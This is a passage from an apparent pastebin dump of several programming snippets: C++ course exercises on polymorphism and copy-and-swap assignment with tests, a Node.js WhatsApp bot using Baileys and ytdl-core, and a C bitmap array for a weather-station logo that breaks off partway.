            auto& tentacle2 = octopus2.GetTentacle(i);
            assert(&tentacle2 != &tentacle1);
            assert(tentacle2.GetId() == tentacle1.GetId());
            assert(tentacle2.GetLinkedTentacle() == tentacle1.GetLinkedTentacle());
        }
    }

    // Проверка самоприсваивания осьминогов
    {
        Octopus octopus(3);

        // Настраиваем состояние осьминога
        octopus.GetTentacle(0).LinkTo(octopus.GetTentacle(1));

        vector<pair<Tentacle*, Tentacle*>> tentacles;
        // Сохраняем информацию о щупальцах осьминога и его копии
        for (int i = 0; i < octopus.GetTentacleCount(); ++i) {
            tentacles.push_back({ &octopus.GetTentacle(i), octopus.GetTentacle(i).GetLinkedTentacle() });
        }

        // Выполняем самоприсваивание
        octopus = octopus;

        // После самоприсваивания состояние осьминога не должно измениться
        assert(octopus.GetTentacleCount() == static_cast<int>(tentacles.size()));
        for (int i = 0; i < octopus.GetTentacleCount(); ++i) {
            auto& tentacle_with_link = tentacles.at(i);
            assert(&octopus.GetTentacle(i) == tentacle_with_link.first);
            assert(octopus.GetTentacle(i).GetLinkedTentacle() == tentacle_with_link.second);
        }
    }
}"
TAGUsYxK,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 11:13:41 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <ctime>
#include <cctype>

using namespace std;

class Shape {
    public:
        virtual double getArea() = 0;
};
class Square : public Shape {
    private:
        double a;
    public:
        Square(double a){
            this->a = a;
        }
        virtual double getArea(){
            return a*a;
        }
};
class Circle : public Shape {
    private:
        double r;
    public:
        Circle(double r){
            this->r = r;
        }
        virtual double getArea(){
            return 3.14159265358979323846*r*r;
        }
};


int main(){

    cout << ""Let's compute area."" << endl;

    Shape *s = NULL;

    cout << ""1 for square, 0 for circle?"" << endl;
    int x;
    cin >> x;

    if(x == 1){
        cout << ""Great. Please enter edge length: "" << endl;
        double edge;
        cin >> edge;
        s = new Square(edge);
    } else if(x == 0){
        cout << ""Great. Please enter radius length: "" << endl;
        double radius;
        cin >> radius;
        s = new Circle(radius);
    }

    if (s != NULL){
        cout << ""We will compute the area"" << endl;
        cout << ""The area is "" << s->getArea() << endl;
        delete s;
    }

    cout << ""Good bye"" << endl;
    return 0;
}"
USjQdsad,СПРИНТ № 7 | Модель памяти в C++ | Урок 10: Присваивание объектов 1/2,chevengur,C++,Tuesday 23rd of April 2024 11:07:32 AM CDT,"#include <algorithm>
#include <cassert>
#include <stdexcept>
#include <vector>
#include <iostream>

using namespace std;

// Используйте эту заготовку PtrVector или замените её на свою реализацию
template <typename T>
class PtrVector {
public:
    PtrVector() = default;

    // Создаёт вектор указателей на копии объектов из other
    PtrVector(const PtrVector& other) {
        // Резервируем место в vector-е для хранения нужного количества элементов
        // Благодаря этому при push_back не будет выбрасываться исключение
        items_.reserve(other.items_.size());

        try {
            for (auto p : other.items_) {
                // Копируем объект, если указатель на него ненулевой
                auto p_copy = p ? new T(*p) : nullptr;  // new может выбросить исключение

                // Не выбросит исключение, т. к. в vector память уже зарезервирована
                items_.push_back(p_copy);
            }
        }
        catch (...) {
            // удаляем элементы в векторе и перевыбрасываем пойманное исключение
            DeleteItems();
            throw;
        }
    }

    // Деструктор удаляет объекты в куче, на которые ссылаются указатели,
    // в векторе items_
    ~PtrVector() {
        DeleteItems();
    }

    PtrVector& operator=(const PtrVector& rhs)
    {
        if (this != &rhs)
        {
            auto rhs_copy(rhs);
            swap_(rhs_copy);
                        
        }
        return *this;
    }

    void swap_(PtrVector& other) noexcept
    {
        swap(other.items_, this->items_);
    }

  
    // Возвращает ссылку на вектор указателей
    vector<T*>& GetItems() noexcept {
        return items_;
    }

    // Возвращает константную ссылку на вектор указателей
    vector<T*> const& GetItems() const noexcept {
        return items_;
    }

private:
    void DeleteItems() noexcept {
        for (auto p : items_) {
            delete p;
        }
    }

    vector<T*> items_;
};

//#include ""octopus.h""


using namespace std;

// Эта функция main тестирует шаблон класса PtrVector
int main() {
    struct CopyingSpy {
        CopyingSpy(int& copy_count, int& deletion_count)
            : copy_count_(copy_count)
            , deletion_count_(deletion_count) {
        }
        CopyingSpy(const CopyingSpy& rhs)
            : copy_count_(rhs.copy_count_)          // счётчик копирований
            , deletion_count_(rhs.deletion_count_)  // счётчик удалений
        {
            if (rhs.throw_on_copy_) {
                throw runtime_error(""copy construction failed""s);
            }
            ++copy_count_;
        }
        ~CopyingSpy() {
            ++deletion_count_;
        }
        void ThrowOnCopy() {
            throw_on_copy_ = true;
        }

    private:
        int& copy_count_;
        int& deletion_count_;
        bool throw_on_copy_ = false;
    };

    // Проверка присваивания
    {
        int item0_copy_count = 0;
        int item0_deletion_count = 0;
        {
            PtrVector<CopyingSpy> v;

            v.GetItems().push_back(new CopyingSpy(item0_copy_count, item0_deletion_count));
            v.GetItems().push_back(nullptr);
            {
                PtrVector<CopyingSpy> v_copy;
                v_copy = v;
                assert(v_copy.GetItems().size() == v.GetItems().size());
                assert(v_copy.GetItems().at(0) != v.GetItems().at(0));
                assert(v_copy.GetItems().at(1) == nullptr);
                assert(item0_copy_count == 1);
                assert(item0_deletion_count == 0);
            }
            assert(item0_deletion_count == 1);
        }
        assert(item0_deletion_count == 2);
    }

    // Проверка корректности самоприсваивания
    {
        int item0_copy_count = 0;
        int item0_deletion_count = 0;

        PtrVector<CopyingSpy> v;
        v.GetItems().push_back(new CopyingSpy(item0_copy_count, item0_deletion_count));
        CopyingSpy* first_item = v.GetItems().front();

        v = v;
        assert(v.GetItems().size() == 1);
        // При самоприсваивании объекты должны быть расположены по тем же адресам
        assert(v.GetItems().front() == first_item);
        assert(item0_copy_count == 0);
        assert(item0_deletion_count == 0);
    }

    // Проверка обеспечения строгой гарантии безопасности исключений при присваивании
    {
        int item0_copy_count = 0;
        int item0_deletion_count = 0;

        int item1_copy_count = 0;
        int item1_deletion_count = 0;

        // v хранит 2 элемента
        PtrVector<CopyingSpy> v;
        v.GetItems().push_back(new CopyingSpy(item0_copy_count, item0_deletion_count));
        v.GetItems().push_back(new CopyingSpy(item1_copy_count, item1_deletion_count));

        int other_item0_copy_count = 0;
        int other_item0_deletion_count = 0;
        // other_vector хранит 1 элемент, при копировании которого будет выброшено исключение
        PtrVector<CopyingSpy> other_vector;
        other_vector.GetItems().push_back(new CopyingSpy(other_item0_copy_count, other_item0_deletion_count));
        other_vector.GetItems().front()->ThrowOnCopy();

        // Сохраняем массив указателей
        auto v_items(v.GetItems());

        try {
            v = other_vector;
            // Операция должна выбросить исключение
            assert(false);
        }
        catch (const runtime_error&) {
        }

        // Элементы массива должны остаться прежними
        assert(v.GetItems() == v_items);
        assert(item0_copy_count == 0);
        assert(item1_copy_count == 0);
        assert(other_item0_copy_count == 0);
    }
}

"
uB7y57Y2,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 10:59:07 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <ctime>
#include <cctype>

using namespace std;


class Animal {
    public:
        virtual void makeSound() = 0;
};
class Dog : public Animal {
    public:
        virtual void makeSound(){
            cout << ""Woof!"" << endl;
        }
};
class Cat : public Animal {
    public:
        virtual void makeSound(){
            cout << ""Meaaaaw!"" << endl;
        }
};
class Parrot : public Animal {
    public:
        virtual void makeSound(){
            cout << ""Hello, I'm a parrot!"" << endl;
        }
};

int main(){

    vector<Animal *> zoo;

    srand(time(NULL));
    for(int i = 0; i < 10; i++){
        /*
        Animal *a;
        switch(rand()%3){
            case 0:
                a = new Dog();
                break;
            case 1:
                a = new Cat();
                break;
            case 2:
                a = new Parrot();
                break;
        }
        zoo.push_back(a);
        */
        zoo.push_back(new Parrot());

    }

    for(int i = 0; i < 10; i++){
        zoo[i]->makeSound();
    }

    for(int i = 0; i < 10; i++){
        delete zoo[i];
    }


    return 0;
}
"
sj7DPDte,package.json,agunq,JSON,Tuesday 23rd of April 2024 10:55:05 AM CDT,"{
  ""dependencies"": {
    ""@whiskeysockets/baileys"": ""^6.6.0"",
    ""qrcode-terminal"": ""^0.12.0"",
    ""ytdl-core"": ""^4.11.5""
  }
}
"
4ZwxuAaV,index.js,agunq,JavaScript,Tuesday 23rd of April 2024 10:53:41 AM CDT,"const {
  default: Baileys,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason
} = require('@whiskeysockets/baileys');

const { Boom } = require(""@hapi/boom"");

const ytdl = require('ytdl-core');

const prefix = ""!"";

async function start() {
  try {
    // Fetch the latest Baileys version and use multi-file auth state
    let { version } = await fetchLatestBaileysVersion();
    let { state, saveCreds } = await useMultiFileAuthState('./session');

    // Create a Baileys connection with specified configurations
    const conn = Baileys({
      auth: state,
      printQRInTerminal: true
      
    });



    // Listen for 'creds.update' event and save credentials
    conn.ev.on(""creds.update"", saveCreds);

    // Listen for 'connection.update' event and handle connection updates
    conn.ev.on(""connection.update"", async (update) => {
      const { lastDisconnect, connection } = update;
    
      // Log connection status
      if (connection) {
        console.log(connection === ""connecting"" ? ""Connecting to the WhatsApp bot..."" : `Connection: ${connection}`);
      }
    
      // Handle different connection states
      switch (connection) {
        case ""open"":
          console.log(""Successfully connected to WhatsApp"");
          break;
        case ""close"":
          handleDisconnect(lastDisconnect.error);
          break;
      }
    });
    
    // Function to handle disconnect reasons
    function handleDisconnect(error) {
      const reason = new Boom(error).output.statusCode;
    
      // Handle specific disconnect reasons
      switch (reason) {
        case DisconnectReason.badSession:
          console.log(""Bad Session File, Please Delete session and Scan Again"");
          conn.logout();
          break;
        case DisconnectReason.connectionClosed:
          console.log(""Connection closed, reconnecting..."");
          start();
          break;
        case DisconnectReason.connectionLost:
          console.log(""Connection Lost from Server, reconnecting..."");
          start();
          break;
        case DisconnectReason.connectionReplaced:
          console.log(""Connection Replaced, Another New Session Opened, Please Close Current Session First"");
          conn.logout();
          break;
        case DisconnectReason.loggedOut:
          console.log(""Device Logged Out, Please Delete session and Scan Again."");
          conn.logout();
          break;
        case DisconnectReason.restartRequired:
          console.log(""Restart Required, Restarting..."");
          start();
          break;
        case DisconnectReason.timedOut:
          console.log(""Connection TimedOut, Reconnecting..."");
          start();
          break;
        default:
          conn.end(`Unknown DisconnectReason: ${reason}|${error}`);
      }
    }

    conn.ev.on(""group-participants.update"", async (msg) => {
      console.log(msg)
    });
    
    // Listen for 'messages.upsert' event and call the handler function

	
    conn.ev.on(""messages.upsert"", async ({messages, type}) => {
      	//console.log(messages[0])
		const noWa = messages[0].key.remoteJid;
		const { text } = messages[0].message.extendedTextMessage;
		console.log(noWa, text);
		if (!messages[0].key.fromMe && text[0] === prefix){

        		let  [cmd, ...args] = text.slice(1).split("" "");
			args = args.join("" "");
			
			if (cmd == ""ping""){
				await conn.sendMessage(noWa, {text: ""Pong""},{quoted: messages[0] });
			}

			if (cmd == ""ytdl""){
				const url = await ytdl.getInfo(args)
				console.log(url.formats[url.formats.length - 1])
				let url_link = url.formats[url.formats.length - 1].url
				await conn.sendMessage(noWa, { video: { url:url_link }, mimetype: 'video/mp4' });
			}
		}

    });
  } catch (error) {
    console.error(error);
  }
}

// Start the application by calling the 'start' function
start();
"
atEAen8x,Simbolini Stazione Meteo,overvolt,C,Tuesday 23rd of April 2024 10:46:44 AM CDT,"
const unsigned char logo[5000] = { /* 0X01,0X01,0XC8,0X00,0XC8,0X00, */
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X07,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,
0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,
0X00,0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X00,0X00,0X00,0X0F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,
0X00,0X00,0X00,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X00,0X00,0X01,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XC0,0X00,0X00,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,0X00,0X00,
0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFE,0X00,0X00,0X03,0XFF,0XF0,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X3F,0XFF,
0XFF,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0XFF,0XE1,0XFF,0XC0,0X00,0X07,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X07,
0XFF,0XE1,0XFF,0XF8,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X1F,0XFF,0XE1,0XFF,0XFE,0X00,0X01,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,
0X00,0X3F,0XFF,0XF3,0XFF,0XFF,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X07,0XFF,0XFF,0XFF,0XFF,
0XFF,0XF8,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFE,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X1C,0XFF,0XFF,
0XFF,0XFF,0XFF,0XCE,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X00,0X07,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X78,
0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X80,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X78,0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X80,
0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,
0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X03,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XC0,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X07,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,
0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X3F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0XFB,0XFF,0XFF,0XFF,0XFF,
0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,
0X7F,0XFF,0XFF,0XFF,0XF1,0XFF,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0XF0,0X7F,0XFF,
0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XF7,0X1F,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XE7,
0X8F,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X00,0X63,0XFF,0XFF,0XFF,0XE7,0XE3,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X43,0XFF,0XFF,
0XFF,0XEF,0XF1,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X41,0XFF,0XFF,0XFF,0XCF,0XFC,0XFF,0XFF,0XFF,0X80,
0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X43,
0XFF,0XFF,0XFF,0XCF,0XF9,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X77,0XFF,0XFF,0XFF,0XDF,0XF3,0XFF,0XFF,
0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,
0X00,0X7F,0XFF,0XFF,0XFF,0X9F,0XE7,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0X9F,0XCF,
0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0XBF,0X9F,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,
0X3F,0X3F,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0X3E,0X7F,0XFF,0XFF,0XFF,0X80,0X1F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,
0XFF,0XFF,0X7C,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFE,0X79,0XFF,0XFF,0XFF,0XFF,
0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,
0X3F,0XFF,0XFF,0XFE,0X63,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFE,0XCF,0XFF,0XFF,
0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X00,0X1F,0XFF,0XFF,0XFC,0X8F,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFD,0X1F,
0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFC,0X7F,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,
0XF8,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XF9,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,
0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X07,
0XFF,0XFF,0XF3,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X07,0XFF,0XFF,0XF7,0XFF,0XFF,0XFF,0XFF,
0XF8,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0XFC,0XFF,0XFF,
0XFF,0XFF,0XFF,0X8F,0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X78,0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X80,0X07,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X38,
0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X18,0X7F,0XFF,0XFF,0XFF,0XFF,0X86,0X00,
